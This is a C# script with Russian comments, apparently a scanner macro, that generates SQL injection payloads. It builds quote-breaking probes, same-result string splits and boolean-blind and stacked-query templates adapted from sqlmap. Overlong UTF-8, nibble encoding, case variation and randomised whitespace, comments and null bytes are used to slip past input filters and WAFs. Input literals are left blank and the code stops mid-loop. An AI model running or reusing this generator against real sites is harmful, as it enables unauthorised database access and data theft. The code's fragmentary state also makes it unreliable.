	//что сделать
		//добавить генерацию или просто перенести sameresult (SQL_SameResult_string, SQL_SameResult_integer, SQL_BooleanBlind_parRep), чтобы для кук и хедеров было
		//добавить Stripped для keywords некоторых select, union и пр

		//добавить error-based https://github.com/sqlmapproject/sqlmap/blob/ef7d4bb404b9bfe9b799a1491626cc7aab3fec91/data/xml/payloads/error_based.xml


		//Входные данные
		string trafficUrl = "
		string trafficMethod = "
		string trafficResultCode = "
		string trafficContentType = "
		string trafficRequestHeaders = "
		string trafficRequestCookies = "
		string trafficRequestBody = "
		string finalPayload = "";
		//переменные из Attack_investigator
		//string getLine = "
		//string getLineReason = System.Text.RegularExpressions.Regex.Match(getLine, @"(?<=Reason:).*?(?=\|)").Value;
		//string getLineParam = System.Text.RegularExpressions.Regex.Match(getLine, @"(?<=Param:).*?(?=\|)").Value;
		string getLineParamValue = "

        //Кодируем спец символы, пробелы и названия таблиц (частично). keywordы только case variation
        var list = "

		char[] quoteArr = { '\'', '\"' };
		char[] prefixArr = { '-', '!', '~', '+' };
		string[] commentsArr = new string[] { "#", "--" }; //"%16" - Microsoft Access comment
		string[] nullbytesArr = new string[] { "%00", "0x00", "\\x00", "[NULL]" }; //не забыть добавить ; перед нулл
		string[] whitespaceArr = new string[]
		{
			"%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0", "/**/", "/**_**/", "+"
		}; // также в MsSql можно другие пробелы юзать
		string commStart = "/*";
		string commEnd = "*/";


		//1. Генерим пейлоады Unexpected value
		//1.1 берем пейлоад и кодируем
		string[] paylds = new string[]
		{
			"'", ")#", "]#", "}#", ")/*", "]/*", "}/*", ")--", "]--", "}--",
			"'", "'#", "'--", "')", "'))", "'(", "']", "'[", "'}", "'{", "'/*", "#'", "--'", ")'", "('", "]'", "['",
			"}'", "{'", "/*'",
			"\"", "\"#", "\"--", "\")", "\"))", "\"(", "\"]", "\"[", "\"}", "\"{", "\"/*", "#\"", "--\"", ")\"", "(\"",
			"]\"", "[\"", "}\"", "{\"", "/*\"",
			"\"\"", "\"\"#", "\"\"--", "\"\")", "\"\"))", "\"\"(", "\"\"]", "\"\"[", "\"\"}", "\"\"{", "\"\"/*",
			"#\"\"", "--\"\"", ")\"\"", "(\"\"", "]\"\"", "[\"\"", "}\"\"", "{\"\"", "/*\"\"",
			"''", "''#", "''--", "'')", "''))", "''(", "'']", "''[", "''}", "''{", "''/*", "#''", "--''", ")''", "(''",
			"]''", "[''", "}''", "{''", "/*''",
			"'\\\"", ";", ")", "\");", "';", "\";", "%'", "%\"", "%')", "%\")", "\")))", "\"))))", "\")))))",
			"\"))))))", "\")))))))", "')))", "'))))", "')))))", "'))))))", "')))))))", ")))", "))))", ")))))", "))))))",
			")))))))", "\\\"", "\\'", "\\"
		};

		string payloadNotEncoded = "";

		foreach (string i in paylds)
		{
			//payloadNotEncoded = i;
			char[] array = i.ToCharArray();
			string final = "";
			StringBuilder strBuild = new StringBuilder();
			for (int y = 0; y < array.Length; y++)
			{
				//еще base64 добавить
				string encodingType =
					Macros.TextProcessing.Spintax("{UTF8|UTF16prc4%|Nibble|DoubleNibble|||||}");
				var b = array[y];
				string input = b.ToString();
				if (encodingType.Equals("DoubleNibble"))
				{
					final = Encoder.DoubleNibble(input);
				}
				else if (encodingType.Equals("Nibble"))
				{
					final = Encoder.Nibble(input);
				}
				else if (encodingType.Equals("UTF16u4"))
				{
					final = Encoder.UTF16u4(input);
				}
				else if (encodingType.Equals("UTF16prc4"))
				{
					final = Encoder.UTF16prc4(input);
				}
				else if (encodingType.Equals("UTF8"))
				{
					final = Encoder.UTF8(input);
				}
				else //если без кодировки
				{
					final = input;
				}

				//вариант все символы
				strBuild.Append(final);
			}

			string payload0 = strBuild.ToString();
			//1.2 Добавляем пробел + нулевый байт
			string ploadNull =
				Macros.TextProcessing.Spintax("{%00|0x00|\\x00|[NULL]|;%00|;0x00|;\\x00|;[NULL]||||||}");
			string ploadWhitesp =
				Macros.TextProcessing.Spintax("{%20|%09|%0a|%0b|%0c|%0d|%a0|/**/|/**_**/|+||||||||||}");
			//1.3 Записываем в лист
			list.Add(payload0 + ploadWhitesp + ploadNull + "|SQL_Unexpected__" + i + ploadWhitesp + ploadNull);

		}
		list.Add("&apos;" + "|SQL_Unexpected");
		list.Add("&#39;" + "|SQL_Unexpected");

		//2. Same result (split and balance)
		//нужно брать query value, разделить, потом соединить. Уже при атаке заменить value на значение из списка Payloads
		//нужно поменять на универсальный скрипт для кук, хедеров, бадиреквеста
		string queryValue = getLineParamValue; //заменить на переменную из проекта
									   //2.1 проверка на numeric или нет
		int value;
		if (int.TryParse(queryValue, out value)) // проверка на numeric или нет
		{
			list.Add(queryValue + "/1" + "|SQL_SameResult_integer");
		}
		//если string
		else
		{
			//делим string рандомно. лучше на 3 части, но 2ая часть из 1 символа, чтобы закодировать может
			Random rnd = new Random();
			int splNumber = rnd.Next(1, queryValue.Length - 1);
			int splNumber1 = splNumber + 1;
			string sub1 = queryValue.Substring(0, splNumber);
			string sub2 = queryValue.Substring(splNumber, 1);
			string sub3 = queryValue.Substring(splNumber1);
			string sub2encoded = "";

			//кодировка  ()|+
			char[] specSymbArr = { '(', ')', '+', '|' };
			string final = "";
			string leftParent = "";
			string rightParent = "";
			string plusSign = "";
			string logSlash = "";
			for (int xyz = 0; xyz < specSymbArr.Length; xyz++)
			{
				//еще base64 добавить
				string input = specSymbArr[xyz].ToString();
				string encodingType = Macros.TextProcessing.Spintax("{UTF8|UTF16prc4|Nibble|DoubleNibble|UrlEncode}");
				if (encodingType.Equals("DoubleNibble"))
				{
					final = Encoder.DoubleNibble(input);
				}
				else if (encodingType.Equals("Nibble"))
				{
					final = Encoder.Nibble(input);
				}
				else if (encodingType.Equals("UrlEncode"))
				{
					final = Encoder.UrlEncode(input);
				}
				else if (encodingType.Equals("UTF16prc4"))
				{
					final = Encoder.UTF16prc4(input);
				}
				else if (encodingType.Equals("UTF8"))
				{
					final = Encoder.UTF8(input);
				}
				else //если без кодировки
				{
					final = input;
				}

				if (input.Equals("("))
				{
					leftParent = final;
				}
				else if (input.Equals(")"))
				{
					rightParent = final;
				}
				else if (input.Equals("+"))
				{
					plusSign = final;
				}
				else if (input.Equals("|"))
				{
					logSlash = final;
				}
			}

			//меняем sub2
			string sub2enc = Macros.TextProcessing.Spintax("{unhex|char|hex|binary|}");
			if (sub2enc.Equals("unhex"))
			{
				var chars = sub2.Select(c => ((int)c).ToString("x2")).ToArray();
				//unhex можно видоименить stripped+case variation, ( закодировать можно
				//case variation
				string unhx = "unhex";
				var randomizer = new Random();
				var finl = unhx.Select(x =>
					randomizer.Next() % 2 == 0
						? (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First())
						: x);
				unhx = new string(finl.ToArray());

				sub2encoded = unhx + leftParent + string.Concat(chars) + rightParent;
			}
			else if (sub2enc.Equals("char"))
			{
				var bytes = Encoding.UTF8.GetBytes(sub2);
				string binary = string.Join("", bytes.Select(b => Convert.ToString(b, 2)));
				int integer = Convert.ToInt32(binary, 2);
				//char можно видоименить, ( закодировать можно
				//case variation
				string chr = "char";
				var randomizer = new Random();
				var fnl = chr.Select(x =>
					randomizer.Next() % 2 == 0
						? (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First())
						: x);
				chr = new string(fnl.ToArray());

				sub2encoded = chr + leftParent + Convert.ToString(integer, 10) + rightParent;
			}
			else if (sub2enc.Equals("hex"))
			{
				var bytes = Encoding.UTF8.GetBytes(sub2);
				string binary = string.Join("", bytes.Select(b => Convert.ToString(b, 2)));
				int integer = Convert.ToInt32(binary, 2);
				sub2encoded = "0x" + Convert.ToString(integer, 16);
			}
			else if (sub2enc.Equals("binary"))
			{
				var bytes = Encoding.UTF8.GetBytes(sub2);
				string binary = string.Join("", bytes.Select(b => Convert.ToString(b, 2)));
				sub2encoded = "0b" + binary;
			}
			else
			{
				sub2encoded = sub2;
			}

			string whitesp = Macros.TextProcessing.Spintax("{%20|%09|%0a|%0b|%0c|%0d|%a0}");
			list.Add(sub1 + "'" + sub2encoded + "'" + sub3 + "|SQL_SameResult_string");
			list.Add(sub1 + "'" + plusSign + sub2encoded + plusSign + "'" + sub3 + "|SQL_SameResult_string");
			list.Add(sub1 + "'" + logSlash + "|" + sub2encoded + "|" + logSlash + "'" + sub3 +
					 "|SQL_SameResult_string");
			list.Add(sub1 + "'" + whitesp + sub2encoded + whitesp + "'" + sub3 + "|SQL_SameResult_string");
		}

		//3. Always True/False|Boolean blind вариация 2-ух запросов

		//Входящие данные
		string[] symbolsStart = new string[]
		{
			"\")", "\"))", "\")))", "\"))))", "\")))))", "\"))))))", "')", "'))", "')))", "'))))", "')))))", "'))))))",
			"\\\")", "\\\"))", "\\\")))", "\\\"))))", "\\\")))))", "\\\"))))))", "\\')", "\\'))", "\\')))", "\\'))))",
			"\\')))))", "\\'))))))", "'", "\"", "\'", "\\\"", ")", "))", ")))", "))))", ")))))", "))))))", ";", "';",
			"\";", "');", "'));", "\"));", "\");", ");", "));"
		};

		string[] commentsEnd = new string[]
		{
			"--", "/*", "--", "/*", "--", "/*",
			"%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%c0%ad%c0%ad", "%c0%ed%c0%ad", "%c0%2d%c0%ad",
			"%c0%2d%c0%2d", "%e0%c0%6d%c0%6d", "%c0%ad%c0%2d", "%c0%6d%c0%2d", "%e0%c0%6d%c0%2d", "%e0%c0%ed%e0%c0%6d",
			"%c0%6d%c0%ad", "%e0%c0%ed%c0%ad", "%c0%ed%e0%c0%ed", "%c0%6d%c0%6d", "%c0%6d%c0%ed", "%c0%ad%c0%6d",
			"%e0%c0%6d%e0%c0%6d", "%e0%c0%ad%c0%ad", "%c0%ed%c0%ed",
			"%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%c0%af%e0%c0%aa", "%c0%ef%c0%ea",
			"%e0%c0%2f%c0%2a", "%e0%c0%2f%c0%ea", "%c0%ef%c0%aa", "%e0%c0%af%c0%6a", "%c0%2f%c0%aa", "%c0%6f%e0%c0%6a",
			"%c0%2f%c0%2a", "%c0%af%c0%aa", "%c0%af%c0%2a", "%c0%ef%c0%6a", "%c0%6f%c0%6a", "%c0%6f%c0%aa",
			"%c0%2f%c0%6a", "%c0%af%e0%c0%6a", "%c0%af%c0%ea", "%c0%ef%c0%2a", "%e0%c0%2f%e0%c0%ea", "%c0%6f%c0%2a",
			"%00", "%00", "%00", "%00", "%00", "0x00", "\x00", "[NULL]", "\\N", "NULL", ";%00", ";%00", ";%00", ";%00", ";0x00", ";[NULL]"
		}; //можно кодировки сразу
		string[] commentsEndMySql = new string[]
		{
			"#", "#", "#", "#", "#", "#", "%23", "%23", "%23", "%23", "%23", "%23", "%c0%e3", "%c0%a3", "%c0%63",
			"%e0%c0%a3", "%c0%23", "%e0%c0%23", "%e0%c0%e3", "%e0%c0%63", "%c0%23", "%c0%23", "%c0%23", "%c0%e3",
			"%c0%a3", "%c0%63", "%c0%e3", "%c0%a3", "%c0%63", "--", "/*", "--", "/*", "--", "/*",
			"%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%2d%2d", "%c0%ad%c0%ad", "%c0%ed%c0%ad", "%c0%2d%c0%ad",
			"%c0%2d%c0%2d", "%c0%ad%c0%2d", "%c0%6d%c0%2d", "%c0%6d%c0%ad", "%c0%6d%c0%6d", "%c0%6d%c0%ed", "%c0%ad%c0%6d", "%e0%c0%ad%c0%ad", "%c0%ed%c0%ed",
			"%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%2f%2a", "%c0%af%e0%c0%aa", "%c0%ef%c0%ea",
			"%c0%ef%c0%aa", "%c0%2f%c0%aa", "%c0%2f%c0%2a", "%c0%af%c0%aa", "%c0%af%c0%2a", "%c0%ef%c0%6a", "%c0%6f%c0%6a", "%c0%6f%c0%aa",
			"%c0%2f%c0%6a", "%c0%af%c0%ea", "%c0%ef%c0%2a", "%c0%6f%c0%2a",
			"%00", "%00", "%00", "%00", "%00", "0x00", "\x00", "[NULL]", "\\N", "NULL", ";%00", ";%00", ";%00", ";%00", ";0x00", ";[NULL]"
		};

		string[] nullbytesEnd = new string[] { "%00", "%00", "%00", "%00", "%00", "0x00", "\x00", "[NULL]", "\\N", "NULL", ";%00", ";%00", ";%00", ";%00", ";0x00", ";[NULL]" };
		string[] whitespcs = new string[] { "%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0", "/**/" }; //убрал /**_**/ и +
																									   //для MySQL MSSQL 
		string[] prfxAfterAndOr = new string[]
		{
			"-", "!", "~", "+", "-", "!", "~", "+", "-", "!", "~", "+",
			"%7e", "%7e", "%7e", "%7e", "%7e", "%7e", "%7e", "%c1%be", "%c1%fe", "%c1%3e", "%c1%7e", "%e0%81%3e",
			"%e0%c1%be", "%e0%81%fe", "%e0%c1%3e", "%e0%41%be", "%e0%81%be", "%e0%81%7e", "%e0%01%fe", "%e0%01%be",
			"%e0%01%7e", "%e0%c1%fe", "%e0%01%3e", "%e0%41%3e", "%e0%41%fe", "%e0%c1%7e",
			"%2B", "%2B", "%2B", "%2B", "%2B", "%2B", "%2B", "%c0%2b", "%e0%c0%eb", "%c0%ab", "%e0%c0%6b", "%c0%6b",
			"%c0%eb", "%e0%c0%2b", "%e0%c0%ab",
			"%2D", "%2D", "%2D", "%2D", "%2D", "%2D", "%2D", "%c0%ed", "%c0%2d", "%c0%6d", "%e0%c0%ad", "%c0%ad",
			"%e0%c0%2d", "%e0%c0%6d",
			"%21", "%21", "%21", "%21", "%21", "%21", "%c0%e1", "%c0%21", "%c0%a1", "%e0%c0%61", "%e0%c0%e1",
			"%e0%c0%21", "%c0%61", "%e0%c0%a1"
		}; //можно кодировки сразу. много доп символов можно для mssql 
		string[] lftParent = new string[]
		{
			"(", "(", "(", "(", "(", "(",
			"%28", "%28", "%28", "%28", "%28", "%28", "%28", "%c0%a8", "%c0%68", "%c0%e8", "%c0%28"
		};
		string[] rghtParnt = new string[]
		{
			")", ")", ")", ")", ")", ")",
			"%29", "%29", "%29", "%29", "%29", "%29", "%29", "%c0%e9", "%c0%a9", "%c0%29", "%c0%69"
		};

		string[] quoteTick = new string[]
		{
			"'", "`", "'", "`", "'", "`", "'", "`",
			"%27", "%27", "%27", "%27", "%27", "%c0%67", "%c0%a7", "%c0%27", "%c0%e7", "%c0%67", "%c0%a7", "%c0%27", "%c0%e7", "%e0%c0%27", "%e0%c0%67", "%e0%c0%a7", "%e0%c0%e7", "%60", "%60", "%60", "%60", "%60", "%60", "%c1%a0", "%c1%20", "%c1%e0", "%c1%60", "%c1%a0", "%c1%20", "%c1%e0", "%c1%60", "%e0%81%a0", "%e0%81%e0", "%e0%01%20", "%e0%c1%a0", "%e0%c1%20", "%e0%01%e0", "%e0%c1%e0", "%e0%01%a0"
		};

		string[] dbName = new string[]
		{
			"mysql", "postgresql", "mssql", "oracle", "sqlite", "HSQLDB"
		}; //для того чтобы полностью нагенерить для этих баз пейлоадов, а для остальных без symbolsStart
		string sleepFunction = "";


		//структура symbolsStartEncoded + " " + andOr + " " + prefixesToAdd + sleepFunction + ( + sleeptime + ) + " " + commentEnd
		string andOr = "";
		string symbolsStartEncoded = "";
		string prefixesToAdd = "";
		string commentEnd = "";
		string prepayload = "";
		string nullEnd = "";
		string payload = "";

		//


		//можно and or заменить
		string[] boolBlindReg = new string[]
		{
			"AND [RANDNUM]=[RANDNUM]", "OR [RANDNUM]=[RANDNUM]", "OR NOT [RANDNUM]=[RANDNUM]", "AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "AND [RANDNUM]=[RANDNUM]", "OR [RANDNUM]=[RANDNUM]", "OR NOT [RANDNUM]=[RANDNUM]", "AND [RANDNUM]=[RANDNUM]", "OR [RANDNUM]=[RANDNUM]", "OR NOT [RANDNUM]=[RANDNUM]", "AND [RANDNUM]=[RANDNUM]", "OR [RANDNUM]=[RANDNUM]", "AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])", "OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])", "AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])", "OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])", "AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]", "OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]", "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL", "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL", "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL", "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL", "MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])", "ELT([RANDNUM]=[RANDNUM],[RANDNUM1])", "([RANDNUM]=[RANDNUM])*[RANDNUM1]", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))", "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)", "IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)", "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)", "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))", ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", ",IIF([RANDNUM]=[RANDNUM],1,1/0)", ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)", "HAVING [RANDNUM]=[RANDNUM]"
		};
		string[] boolBlindParReplace = new string[]
		{
			"RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])", "ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])", "([RANDNUM]=[RANDNUM])*[ORIGVALUE]", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)", "IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)", "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)", "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", ",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)", ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)"
		};
		string[] boolBlindStacked = new string[]
		{
			"SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)", "SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1", "IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]", "SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)", "SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL", "IIF([RANDNUM]=[RANDNUM],1,1/0)", "SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END"
		};

		for (int aw = 0; aw < boolBlindReg.Length; aw++)
		{
			prepayload = boolBlindReg[aw].ToString();


			//prepayload заменяем whitespaces
			int countWhitsp = prepayload.Split(' ').Length - 1;
			for (int i = 0; i < countWhitsp; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(whitespcs.Length);
				string whitSp = whitespcs[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
			}
			//"("
			int countLeftPar = prepayload.Split('(').Length - 1;
			for (int i = 0; i < countLeftPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(lftParent.Length);
				string lftPar = lftParent[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
			}
			//")"
			int countRightPar = prepayload.Split(')').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(rghtParnt.Length);
				string rgtPar = rghtParnt[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
			}
			//"'"
			int countQuote = prepayload.Split('\'').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(quoteTick.Length);
				string quotTick = quoteTick[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
			}

			//меняем [RANDSTR], [RANDNUM], [RANDNUM1], [RANDNUM2]
			string randStr = Encoder.RandomString(7);
			string randNum = Encoder.RandomNumber(5);
			string randNum1 = Encoder.RandomNumber(5);
			string randNum2 = Encoder.RandomNumber(5);
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDSTR]", randStr, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM1]", randNum1, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM2]", randNum2, "Text", "All");

			//queryValue[ORIGVALUE]

			string prepayload1 = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "Range", "0,2");//нужно заменять 1 и 3 совпадение
			prepayload1 = Macros.TextProcessing.Replace(prepayload1, "[RANDNUM]", randNum1, "Text", "Range", "0,1");//нужно заменять 2 и 4 совпадение
			//prepayload1 = Macros.TextProcessing.Replace(prepayload1, "[RANDNUM1]", randNum1, "Text", "Range", "1,3");//нужно заменять 2 и 4 совпадение

			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "All");

			//Попробовать нужно Stripped
			prepayload = Macros.TextProcessing.Replace(prepayload, "SELECT", Encoder.Stripped("SELECT"), "Text", "First");
			prepayload1 = Macros.TextProcessing.Replace(prepayload1, "SELECT", Encoder.Stripped("SELECT"), "Text", "First");

			//Case Variation
			payload = Encoder.CaseVariation(prepayload);
			string payload1 = Encoder.CaseVariation(prepayload1);


			//			int strNumArr = boolBlindReg.IndexOf[aw];
			//Добавляем в список запрос1 и запрос2 (с которым сравнить нужно будет). Можно много еще пейлоадов нагенериь, но пока этот.
			list.Add("' " + payload + "|SQL_BooleanBlind_reg+" + aw + "_1_0");
			list.Add("' " + payload1 + "|SQL_BooleanBlind_reg+" + aw + "_1_1");//строки с _1 пропадают бывает хз
			list.Add(" " + payload + "|SQL_BooleanBlind_reg+" + aw + "_2_0");
			list.Add(" " + payload1 + "|SQL_BooleanBlind_reg+" + aw + "_2_1");
			list.Add("\" " + payload + "|SQL_BooleanBlind_reg+" + aw + "_3_0");
			list.Add("\" " + payload1 + "|SQL_BooleanBlind_reg+" + aw + "_3_1");
			list.Add(")" + payload + "|SQL_BooleanBlind_reg+" + aw + "_4_0");
			list.Add(")" + payload1 + "|SQL_BooleanBlind_reg+" + aw + "_4_1");
			list.Add("\\' " + payload + "|SQL_BooleanBlind_reg+" + aw + "_5_0");
			list.Add("\\' " + payload1 + "|SQL_BooleanBlind_reg+" + aw + "_5_1");
		}
		//840 строк на SQL_BooleanBlind_reg. хз может овердохуя

		for (int aq = 0; aq < boolBlindParReplace.Length; aq++)
		{
			prepayload = boolBlindParReplace[aq].ToString();


			//prepayload заменяем whitespaces
			int countWhitsp = prepayload.Split(' ').Length - 1;
			for (int i = 0; i < countWhitsp; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(whitespcs.Length);
				string whitSp = whitespcs[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
			}
			//"("
			int countLeftPar = prepayload.Split('(').Length - 1;
			for (int i = 0; i < countLeftPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(lftParent.Length);
				string lftPar = lftParent[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
			}
			//")"
			int countRightPar = prepayload.Split(')').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(rghtParnt.Length);
				string rgtPar = rghtParnt[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
			}
			//"'"
			int countQuote = prepayload.Split('\'').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(quoteTick.Length);
				string quotTick = quoteTick[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
			}

			//меняем [RANDSTR], [RANDNUM], [RANDNUM1], [RANDNUM2], [ORIGVALUE]
			string randStr = Encoder.RandomString(7);
			string randNum = Encoder.RandomNumber(5);
			string randNum1 = Encoder.RandomNumber(5);
			string randNum2 = Encoder.RandomNumber(5);
